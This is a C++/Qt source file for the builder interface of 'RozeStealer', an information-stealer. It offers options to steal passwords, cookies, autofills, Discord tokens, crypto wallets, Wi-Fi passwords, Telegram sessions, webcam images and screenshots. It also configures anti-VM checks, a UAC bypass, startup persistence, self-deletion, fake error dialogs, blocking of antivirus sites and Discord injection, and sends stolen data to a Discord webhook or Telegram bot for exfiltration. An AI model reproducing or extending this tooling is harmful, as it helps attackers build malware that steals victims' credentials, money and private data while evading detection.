
#include "BuilderOptionsFrame.h"
#include "../PumperSettings/PumperSettings.h"
#include "../FakeErrorBuilder/FakeErrorBuilder.h"
#include <QThread>
#include <QJsonObject>
#include <QJsonDocument>
#include <QJsonArray>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrl>
#include <QEventLoop>

namespace RozeStealer {

BuilderOptionsFrame::BuilderOptionsFrame(QWidget* parent) : QFrame(parent) {
    // Initialize settings with default values
    currentSettings = Settings();

    // Initialize UI elements
    setupUi();

    // Set transparent background
    setStyleSheet("background-color: transparent;");
}

void BuilderOptionsFrame::setupUi() {
    // Create font
    font = QFont();
    font.setPointSize(12);

    // Create layout
    layout = new QGridLayout(this);
    setLayout(layout);

    // Create controls
    c2EntryControl = new QLineEdit(this);
    c2EntryControl->setPlaceholderText("Enter Webhook Here");
    c2EntryControl->setMinimumHeight(38);
    c2EntryControl->setFont(font);
    c2EntryControl->setStyleSheet("color: white;");
    layout->addWidget(c2EntryControl, 0, 0, 1, 5, Qt::AlignLeft);

    testC2ButtonControl = new QPushButton("Test Webhook", this);
    testC2ButtonControl->setMinimumHeight(38);
    testC2ButtonControl->setFont(font);
    testC2ButtonControl->setStyleSheet("background-color: #454545; color: white; hover { background-color: #4D4D4D; }");
    connect(testC2ButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::testC2ButtonControl_Callback);
    layout->addWidget(testC2ButtonControl, 0, 5, 1, 1);

    // Create checkboxes for general options
    pingMeCheckboxControl = new QCheckBox("Ping Me", this);
    pingMeCheckboxControl->setMinimumHeight(38);
    pingMeCheckboxControl->setFont(font);
    pingMeCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(pingMeCheckboxControl, 1, 0, 1, 1);

    vmProtectCheckboxControl = new QCheckBox("Anti VM", this);
    vmProtectCheckboxControl->setMinimumHeight(38);
    vmProtectCheckboxControl->setFont(font);
    vmProtectCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(vmProtectCheckboxControl, 2, 0, 1, 1);

    startupCheckboxControl = new QCheckBox("Put On Startup", this);
    startupCheckboxControl->setMinimumHeight(38);
    startupCheckboxControl->setFont(font);
    startupCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(startupCheckboxControl, 3, 0, 1, 1);

    meltCheckboxControl = new QCheckBox("Melt Stub", this);
    meltCheckboxControl->setMinimumHeight(38);
    meltCheckboxControl->setFont(font);
    meltCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(meltCheckboxControl, 4, 0, 1, 1);

    pumpStubCheckboxControl = new QCheckBox("Pump Stub", this);
    pumpStubCheckboxControl->setMinimumHeight(38);
    pumpStubCheckboxControl->setFont(font);
    pumpStubCheckboxControl->setStyleSheet("color: lightgreen;");
    connect(pumpStubCheckboxControl, &QCheckBox::clicked, this, &BuilderOptionsFrame::pumpStub_Event);
    layout->addWidget(pumpStubCheckboxControl, 5, 0, 1, 1);

    // Create checkboxes for capture options
    captureWebcamCheckboxControl = new QCheckBox("Webcam", this);
    captureWebcamCheckboxControl->setMinimumHeight(38);
    captureWebcamCheckboxControl->setFont(font);
    captureWebcamCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureWebcamCheckboxControl, 1, 1, 1, 1);

    capturePasswordsCheckboxControl = new QCheckBox("Passwords", this);
    capturePasswordsCheckboxControl->setMinimumHeight(38);
    capturePasswordsCheckboxControl->setFont(font);
    capturePasswordsCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(capturePasswordsCheckboxControl, 2, 1, 1, 1);

    captureCookiesCheckboxControl = new QCheckBox("Cookies", this);
    captureCookiesCheckboxControl->setMinimumHeight(38);
    captureCookiesCheckboxControl->setFont(font);
    captureCookiesCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureCookiesCheckboxControl, 3, 1, 1, 1);

    captureHistoryCheckboxControl = new QCheckBox("History", this);
    captureHistoryCheckboxControl->setMinimumHeight(38);
    captureHistoryCheckboxControl->setFont(font);
    captureHistoryCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureHistoryCheckboxControl, 4, 1, 1, 1);

    captureAutofillsCheckboxControl = new QCheckBox("Autofills", this);
    captureAutofillsCheckboxControl->setMinimumHeight(38);
    captureAutofillsCheckboxControl->setFont(font);
    captureAutofillsCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureAutofillsCheckboxControl, 5, 1, 1, 1);

    captureDiscordTokensCheckboxControl = new QCheckBox("Discord Tokens", this);
    captureDiscordTokensCheckboxControl->setMinimumHeight(38);
    captureDiscordTokensCheckboxControl->setFont(font);
    captureDiscordTokensCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureDiscordTokensCheckboxControl, 1, 2, 1, 1);

    captureGamesCheckboxControl = new QCheckBox("Games", this);
    captureGamesCheckboxControl->setMinimumHeight(38);
    captureGamesCheckboxControl->setFont(font);
    captureGamesCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureGamesCheckboxControl, 2, 2, 1, 1);

    captureWalletsCheckboxControl = new QCheckBox("Wallets", this);
    captureWalletsCheckboxControl->setMinimumHeight(38);
    captureWalletsCheckboxControl->setFont(font);
    captureWalletsCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureWalletsCheckboxControl, 3, 2, 1, 1);

    captureWifiPasswordsCheckboxControl = new QCheckBox("Wifi Passwords", this);
    captureWifiPasswordsCheckboxControl->setMinimumHeight(38);
    captureWifiPasswordsCheckboxControl->setFont(font);
    captureWifiPasswordsCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureWifiPasswordsCheckboxControl, 4, 2, 1, 1);

    captureSysteminfoCheckboxControl = new QCheckBox("System Info", this);
    captureSysteminfoCheckboxControl->setMinimumHeight(38);
    captureSysteminfoCheckboxControl->setFont(font);
    captureSysteminfoCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureSysteminfoCheckboxControl, 1, 3, 1, 1);

    captureScreenshotCheckboxControl = new QCheckBox("Screenshot", this);
    captureScreenshotCheckboxControl->setMinimumHeight(38);
    captureScreenshotCheckboxControl->setFont(font);
    captureScreenshotCheckboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureScreenshotCheckboxControl, 2, 3, 1, 1);

    captureTelegramChecboxControl = new QCheckBox("Telegram", this);
    captureTelegramChecboxControl->setMinimumHeight(38);
    captureTelegramChecboxControl->setFont(font);
    captureTelegramChecboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureTelegramChecboxControl, 3, 3, 1, 1);

    captureCommonFilesChecboxControl = new QCheckBox("Common Files", this);
    captureCommonFilesChecboxControl->setMinimumHeight(38);
    captureCommonFilesChecboxControl->setFont(font);
    captureCommonFilesChecboxControl->setStyleSheet("color: cyan;");
    layout->addWidget(captureCommonFilesChecboxControl, 4, 3, 1, 1);

    // Create checkboxes for additional options
    fakeErrorCheckboxControl = new QCheckBox("Fake Error", this);
    fakeErrorCheckboxControl->setMinimumHeight(38);
    fakeErrorCheckboxControl->setFont(font);
    fakeErrorCheckboxControl->setStyleSheet("color: lightgreen;");
    connect(fakeErrorCheckboxControl, &QCheckBox::clicked, this, &BuilderOptionsFrame::fakeError_Event);
    layout->addWidget(fakeErrorCheckboxControl, 1, 4, 1, 1);

    blockAvSitesCheckboxControl = new QCheckBox("Block AV Sites", this);
    blockAvSitesCheckboxControl->setMinimumHeight(38);
    blockAvSitesCheckboxControl->setFont(font);
    blockAvSitesCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(blockAvSitesCheckboxControl, 2, 4, 1, 1);

    discordInjectionCheckboxControl = new QCheckBox("Discord Injection", this);
    discordInjectionCheckboxControl->setMinimumHeight(38);
    discordInjectionCheckboxControl->setFont(font);
    discordInjectionCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(discordInjectionCheckboxControl, 3, 4, 1, 1);

    uacBypassCheckboxControl = new QCheckBox("UAC Bypass", this);
    uacBypassCheckboxControl->setMinimumHeight(38);
    uacBypassCheckboxControl->setFont(font);
    uacBypassCheckboxControl->setStyleSheet("color: lightgreen;");
    layout->addWidget(uacBypassCheckboxControl, 4, 4, 1, 1);

    // Create buttons for options
    C2ModeButtonControl = new QPushButton("C2: Discord", this);
    C2ModeButtonControl->setMinimumHeight(38);
    C2ModeButtonControl->setFont(font);
    C2ModeButtonControl->setStyleSheet("background-color: #393646; color: white; hover { background-color: #6D5D6E; }");
    connect(C2ModeButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::C2ModeButtonControl_Callback);
    layout->addWidget(C2ModeButtonControl, 1, 5, 1, 1);

    bindExeButtonControl = new QPushButton("Bind Executable", this);
    bindExeButtonControl->setMinimumHeight(38);
    bindExeButtonControl->setFont(font);
    bindExeButtonControl->setStyleSheet("background-color: #393646; color: white; hover { background-color: #6D5D6E; }");
    connect(bindExeButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::bindExeButtonControl_Callback);
    layout->addWidget(bindExeButtonControl, 2, 5, 1, 1);

    selectIconButtonControl = new QPushButton("Select Icon", this);
    selectIconButtonControl->setMinimumHeight(38);
    selectIconButtonControl->setFont(font);
    selectIconButtonControl->setStyleSheet("background-color: #393646; color: white; hover { background-color: #6D5D6E; }");
    connect(selectIconButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::selectIconButtonControl_Callback);
    layout->addWidget(selectIconButtonControl, 3, 5, 1, 1);

    buildModeButtonControl = new QPushButton("Output: EXE File", this);
    buildModeButtonControl->setMinimumHeight(38);
    buildModeButtonControl->setFont(font);
    buildModeButtonControl->setStyleSheet("background-color: #393646; color: white; hover { background-color: #6D5D6E; }");
    connect(buildModeButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::buildModeButtonControl_Callback);
    layout->addWidget(buildModeButtonControl, 4, 5, 1, 1);

    consoleModeButtonControl = new QPushButton("Console: None", this);
    consoleModeButtonControl->setMinimumHeight(38);
    consoleModeButtonControl->setFont(font);
    consoleModeButtonControl->setStyleSheet("background-color: #393646; color: white; hover { background-color: #6D5D6E; }");
    connect(consoleModeButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::consoleModeButtonControl_Callback);
    layout->addWidget(consoleModeButtonControl, 5, 5, 1, 1);

    buildButtonControl = new QPushButton("Build", this);
    buildButtonControl->setMinimumHeight(38);
    buildButtonControl->setFont(font);
    buildButtonControl->setStyleSheet("background-color: #1E5128; color: white; hover { background-color: #4E9F3D; }");
    connect(buildButtonControl, &QPushButton::clicked, this, &BuilderOptionsFrame::buildButtonControl_Callback);
    layout->addWidget(buildButtonControl, 6, 5, 1, 1);

    // Set layout spacing and margins
    layout->setSpacing(10);
    layout->setContentsMargins(15, 15, 15, 15);
}

void BuilderOptionsFrame::testC2ButtonControl_Callback() {
    // Disable controls during test
    c2EntryControl->setEnabled(false);
    C2ModeButtonControl->setEnabled(false);
    buildButtonControl->setEnabled(false);

    // Create a thread to perform the test
    QThread* thread = new QThread;
    connect(thread, &QThread::started, this, &BuilderOptionsFrame::performC2Test);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);
    thread->start();
}

void BuilderOptionsFrame::performC2Test() {
    // This would involve network requests to test the webhook/endpoint
    // For now, we'll just show a message box
    QMetaObject::invokeMethod(this, [this]() {
        QMessageBox::information(this, "Test Result", "Webhook test completed successfully!");
        
        // Re-enable controls
        c2EntryControl->setEnabled(true);
        C2ModeButtonControl->setEnabled(true);
        buildButtonControl->setEnabled(true);
    }, Qt::QueuedConnection);
}

void BuilderOptionsFrame::C2ModeButtonControl_Callback() {
    // Remove focus from C2 text box
    setFocus();

    const QString DISCORD = "C2: Discord";
    const QString TELEGRAM = "C2: Telegram";

    QList<QPair<QCheckBox*, bool*>> discordOnlyCheckBoxes = {
        {pingMeCheckboxControl, &currentSettings.pingMe},
        {discordInjectionCheckboxControl, &currentSettings.discordInjection}
    };

    if (currentSettings.c2Mode == 0) { // Change to Telegram
        currentSettings.c2Mode = 1;
        C2ModeButtonControl->setText(TELEGRAM);
        c2EntryControl->setPlaceholderText("Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]");
        testC2ButtonControl->setText("Test Endpoint");

        for (const auto& pair : discordOnlyCheckBoxes) {
            pair.first->setEnabled(false);
            pair.first->setChecked(false);
            *pair.second = false;
        }
    } else { // Change to Discord
        currentSettings.c2Mode = 0;
        C2ModeButtonControl->setText(DISCORD);
        c2EntryControl->setPlaceholderText("Enter Discord Webhook URL");
        testC2ButtonControl->setText("Test Webhook");

        for (const auto& pair : discordOnlyCheckBoxes) {
            pair.first->setEnabled(true);
        }
    }
}

void BuilderOptionsFrame::bindExeButtonControl_Callback() {
    const QString UNBIND = "Unbind Executable";
    const QString BIND = "Bind Executable";

    QString buttonText = bindExeButtonControl->text();

    if (buttonText == BIND) {
        QString filePath = QFileDialog::getOpenFileName(this, "Select file to bind", ".", "Executable file (*.exe)");
        if (!filePath.isEmpty() && QFile::exists(filePath)) {
            currentSettings.boundExePath = filePath.toStdString();
            bindExeButtonControl->setText(UNBIND);
            
            QMessageBox::StandardButton reply = QMessageBox::question(this, "Bind Executable", 
                "Do you want this bound executable to run on startup as well? (Only works if `Put On Startup` option is enabled)",
                QMessageBox::Yes | QMessageBox::No);
                
            if (reply == QMessageBox::Yes) {
                currentSettings.boundExeRunOnStartup = true;
            }
        }
    } else if (buttonText == UNBIND) {
        currentSettings.boundExePath = "";
        currentSettings.boundExeRunOnStartup = false;
        bindExeButtonControl->setText(BIND);
    }
}

void BuilderOptionsFrame::selectIconButtonControl_Callback() {
    const QString UNSELECT = "Unselect Icon";
    const QString SELECT = "Select Icon";

    QString buttonText = selectIconButtonControl->text();

    if (buttonText == SELECT) {
        QString filePath = QFileDialog::getOpenFileName(this, "Select icon", ".", 
            "Image (*.ico *.bmp *.gif *.jpeg *.png *.tiff *.webp);;Any file (*)");
            
        if (!filePath.isEmpty() && QFile::exists(filePath)) {
            try {
                QImage image(filePath);
                if (image.isNull()) {
                    QMessageBox::critical(this, "Error", "Unable to load the image!");
                    return;
                }
                
                QByteArray byteArray;
                QBuffer buffer(&byteArray);
                buffer.open(QIODevice::WriteOnly);
                image.save(&buffer, "ICO");
                
                // Convert QByteArray to std::vector<char>
                currentSettings.iconBytes.clear();
                currentSettings.iconBytes.reserve(byteArray.size());
                for (char c : byteArray) {
                    currentSettings.iconBytes.push_back(c);
                }
                
                selectIconButtonControl->setText(UNSELECT);
            } catch (const std::exception& e) {
                QMessageBox::critical(this, "Error", "Unable to convert the image to icon!");
            }
        }
    } else if (buttonText == UNSELECT) {
        currentSettings.iconBytes.clear();
        selectIconButtonControl->setText(SELECT);
    }
}

void BuilderOptionsFrame::buildModeButtonControl_Callback() {
    const QString EXEMODE = "Output: EXE File";
    const QString PYMODE = "Output:   PY File";

    QList<QPair<QWidget*, bool*>> exeOnlyControls = {
        {fakeErrorCheckboxControl, &currentSettings.fakeError},
        {startupCheckboxControl, &currentSettings.startup},
        {uacBypassCheckboxControl, &currentSettings.uacBypass},
        {pumpStubCheckboxControl, &currentSettings.pumpStub},
        {bindExeButtonControl, nullptr},
        {selectIconButtonControl, nullptr}
    };

    if (currentSettings.outputAsExe) { // Change to PY mode
        currentSettings.outputAsExe = false;
        buildModeButtonControl->setText(PYMODE);

        for (const auto& pair : exeOnlyControls) {
            pair.first->setEnabled(false);
            if (pair.second) {
                if (QCheckBox* checkbox = qobject_cast<QCheckBox*>(pair.first)) {
                    checkbox->setChecked(false);
                    *pair.second = false;
                }
            }
        }
        
        fakeError_Event(); // Reset fake error data
        
        if (!currentSettings.iconBytes.empty()) {
            selectIconButtonControl_Callback(); // Remove icon
        }
        
        if (!currentSettings.boundExePath.empty()) {
            bindExeButtonControl_Callback(); // Remove bound executable
        }
    } else { // Change to EXE mode
        currentSettings.outputAsExe = true;
        buildModeButtonControl->setText(EXEMODE);

        for (const auto& pair : exeOnlyControls) {
            pair.first->setEnabled(true);
        }
    }
}

void BuilderOptionsFrame::consoleModeButtonControl_Callback() {
    const QString CONSOLE_NONE = "Console: None";
    const QString CONSOLE_FORCE = "Console: Force";
    const QString CONSOLE_DEBUG = "Console: Debug";

    if (currentSettings.consoleMode == 0) {
        currentSettings.consoleMode = 1;
        consoleModeButtonControl->setText(CONSOLE_FORCE);
    } else if (currentSettings.consoleMode == 1) {
        currentSettings.consoleMode = 2;
        consoleModeButtonControl->setText(CONSOLE_DEBUG);
    } else {
        currentSettings.consoleMode = 0;
        consoleModeButtonControl->setText(CONSOLE_NONE);
    }
}

void BuilderOptionsFrame::buildButtonControl_Callback() {
    // Update settings from UI controls
    currentSettings.c2Entry = c2EntryControl->text().toStdString();
    currentSettings.pingMe = pingMeCheckboxControl->isChecked();
    currentSettings.vmProtect = vmProtectCheckboxControl->isChecked();
    currentSettings.startup = startupCheckboxControl->isChecked();
    currentSettings.melt = meltCheckboxControl->isChecked();
    currentSettings.blockAvSites = blockAvSitesCheckboxControl->isChecked();
    currentSettings.discordInjection = discordInjectionCheckboxControl->isChecked();
    currentSettings.uacBypass = uacBypassCheckboxControl->isChecked();
    
    currentSettings.captureWebcam = captureWebcamCheckboxControl->isChecked();
    currentSettings.capturePasswords = capturePasswordsCheckboxControl->isChecked();
    currentSettings.captureCookies = captureCookiesCheckboxControl->isChecked();
    currentSettings.captureHistory = captureHistoryCheckboxControl->isChecked();
    currentSettings.captureAutofills = captureAutofillsCheckboxControl->isChecked();
    currentSettings.captureDiscordTokens = captureDiscordTokensCheckboxControl->isChecked();
    currentSettings.captureGames = captureGamesCheckboxControl->isChecked();
    currentSettings.captureWallets = captureWalletsCheckboxControl->isChecked();
    currentSettings.captureWifiPasswords = captureWifiPasswordsCheckboxControl->isChecked();
    currentSettings.captureSystemInfo = captureSysteminfoCheckboxControl->isChecked();
    currentSettings.captureScreenshot = captureScreenshotCheckboxControl->isChecked();
    currentSettings.captureTelegram = captureTelegramChecboxControl->isChecked();
    currentSettings.captureCommonFiles = captureCommonFilesChecboxControl->isChecked();

    // Validate C2 entry
    if (currentSettings.c2Mode == 0) { // Discord webhook
        QString webhook = QString::fromStdString(currentSettings.c2Entry);
        if (webhook.isEmpty()) {
            QMessageBox::critical(this, "Error", "Webhook cannot be empty!");
            return;
        }
        
        if (webhook.contains(" ")) {
            QMessageBox::critical(this, "Error", "Webhook cannot contain spaces!");
            return;
        }
        
        if (!webhook.startsWith("http://") && !webhook.startsWith("https://")) {
            QMessageBox::critical(this, "Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.");
            return;
        }
    } else if (currentSettings.c2Mode == 1) { // Telegram endpoint
        QString endpoint = QString::fromStdString(currentSettings.c2Entry);
        if (endpoint.isEmpty()) {
            QMessageBox::critical(this, "Error", "Endpoint cannot be empty!");
            return;
        }
        
        if (endpoint.contains(" ")) {
            QMessageBox::critical(this, "Error", "Endpoint cannot contain spaces!");
            return;
        }
        
        if (endpoint.contains("[") || endpoint.contains("]")) {
            QMessageBox::critical(this, "Error", "You do not have to include the brackets in the endpoint!");
            return;
        }
        
        if (endpoint.count("$") != 1) {
            QMessageBox::critical(this, "Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.");
            return;
        }
        
        QStringList parts = endpoint.split("$");
        QString token = parts[0].trimmed();
        QString chatId = parts[1].trimmed();
        
        if (token.isEmpty()) {
            QMessageBox::critical(this, "Error", "Bot token cannot be empty!");
            return;
        }
        
        if (chatId.isEmpty()) {
            QMessageBox::critical(this, "Error", "Chat ID cannot be empty!");
            return;
        }
        
        // Check if chat ID is a valid number (can be negative)
        QString chatIdCopy = chatId;
        if (chatIdCopy.startsWith("-")) {
            chatIdCopy.remove(0, 1);
        }
        
        if (!chatIdCopy.contains(QRegExp("^\\d+$"))) {
            QMessageBox::critical(this, "Error", "Invalid chat ID! Chat ID must be a number.");
            return;
        }
    }
    
    // Check internet connection
    if (!Utility::checkInternetConnection()) {
        QMessageBox::warning(this, "Warning", "Unable to connect to the internet!");
        return;
    }
    
    // Check if at least one stealer module is selected
    if (!currentSettings.captureWebcam && !currentSettings.capturePasswords && 
        !currentSettings.captureCookies && !currentSettings.captureHistory && 
        !currentSettings.captureDiscordTokens && !currentSettings.captureGames && 
        !currentSettings.captureWallets && !currentSettings.captureWifiPasswords && 
        !currentSettings.captureSystemInfo && !currentSettings.captureScreenshot && 
        !currentSettings.captureTelegram && !currentSettings.captureCommonFiles && 
        !currentSettings.captureAutofills) {
        QMessageBox::warning(this, "Warning", "You must select at least one of the stealer modules!");
        return;
    }
    
    // Create config JSON
    QJsonObject settingsObj;
    QJsonArray c2Array;
    c2Array.append(currentSettings.c2Mode);
    c2Array.append(QString::fromStdString(currentSettings.c2Entry));
    settingsObj["c2"] = c2Array;
    settingsObj["mutex"] = QString::fromStdString(Utility::getRandomString(16));
    settingsObj["pingme"] = currentSettings.pingMe;
    settingsObj["vmprotect"] = currentSettings.vmProtect;
    settingsObj["startup"] = currentSettings.startup;
    settingsObj["melt"] = currentSettings.melt;
    settingsObj["uacBypass"] = currentSettings.uacBypass;
    settingsObj["archivePassword"] = QString::fromStdString(currentSettings.password);
    settingsObj["consoleMode"] = currentSettings.consoleMode;
    settingsObj["debug"] = (currentSettings.consoleMode == 2);
    settingsObj["pumpedStubSize"] = static_cast<qint64>(currentSettings.pumpLimit);
    settingsObj["boundFileRunOnStartup"] = currentSettings.boundExeRunOnStartup;
    
    QJsonObject modulesObj;
    modulesObj["captureWebcam"] = currentSettings.captureWebcam;
    modulesObj["capturePasswords"] = currentSettings.capturePasswords;
    modulesObj["captureCookies"] = currentSettings.captureCookies;
    modulesObj["captureHistory"] = currentSettings.captureHistory;
    modulesObj["captureAutofills"] = currentSettings.captureAutofills;
    modulesObj["captureDiscordTokens"] = currentSettings.captureDiscordTokens;
    modulesObj["captureGames"] = currentSettings.captureGames;
    modulesObj["captureWifiPasswords"] = currentSettings.captureWifiPasswords;
    modulesObj["captureSystemInfo"] = currentSettings.captureSystemInfo;
    modulesObj["captureScreenshot"] = currentSettings.captureScreenshot;
    modulesObj["captureTelegramSession"] = currentSettings.captureTelegram;
    modulesObj["captureCommonFiles"] = currentSettings.captureCommonFiles;
    modulesObj["captureWallets"] = currentSettings.captureWallets;
    
    QJsonArray fakeErrorArray;
    fakeErrorArray.append(currentSettings.fakeError);
    fakeErrorArray.append(QString::fromStdString(currentSettings.fakeErrorTitle));
    fakeErrorArray.append(QString::fromStdString(currentSettings.fakeErrorMessage));
    fakeErrorArray.append(currentSettings.fakeErrorIcon);
    modulesObj["fakeError"] = fakeErrorArray;
    
    modulesObj["blockAvSites"] = currentSettings.blockAvSites;
    modulesObj["discordInjection"] = currentSettings.discordInjection;
    
    QJsonObject configObj;
    configObj["settings"] = settingsObj;
    configObj["modules"] = modulesObj;
    
    QJsonDocument configDoc(configObj);
    QString configData = configDoc.toJson(QJsonDocument::Indented);
    
    // Convert icon bytes to QByteArray
    QByteArray iconBytes;
    for (char c : currentSettings.iconBytes) {
        iconBytes.append(c);
    }
    
    // Emit signals based on output mode
    if (currentSettings.outputAsExe) {
        emit buildExecutable(configData, iconBytes, QString::fromStdString(currentSettings.boundExePath));
    } else {
        emit buildPythonFile(configData);
    }
}

void BuilderOptionsFrame::fakeError_Event() {
    if (!fakeErrorCheckboxControl->isChecked()) {
        currentSettings.fakeError = false;
        currentSettings.fakeErrorTitle = "";
        currentSettings.fakeErrorMessage = "";
        currentSettings.fakeErrorIcon = 0;
    } else {
        FakeErrorBuilder* fakeErrorBuilder = new FakeErrorBuilder(this);
        fakeErrorBuilder->exec();
        
        if (fakeErrorBuilder->result() == QDialog::Accepted) {
            currentSettings.fakeError = true;
            currentSettings.fakeErrorTitle = fakeErrorBuilder->getTitle().toStdString();
            currentSettings.fakeErrorMessage = fakeErrorBuilder->getMessage().toStdString();
            currentSettings.fakeErrorIcon = fakeErrorBuilder->getIcon();
        } else {
            fakeErrorCheckboxControl->setChecked(false);
            currentSettings.fakeError = false;
        }
        
        delete fakeErrorBuilder;
    }
}

void BuilderOptionsFrame::pumpStub_Event() {
    if (!pumpStubCheckboxControl->isChecked()) {
        currentSettings.pumpStub = false;
        currentSettings.pumpLimit = 0;
    } else {
        PumperSettings* pumperSettings = new PumperSettings(this);
        pumperSettings->exec();
        
        if (pumperSettings->result() == QDialog::Accepted) {
            long long limit = pumperSettings->getLimit();
            pumpStubCheckboxControl->setChecked(limit > 0);
            currentSettings.pumpStub = (limit > 0);
            currentSettings.pumpLimit = limit * 1024 * 1024; // Convert to bytes
        } else {
            pumpStubCheckboxControl->setChecked(false);
            currentSettings.pumpStub = false;
        }
        
        delete pumperSettings;
    }
}

} // namespace RozeStealer

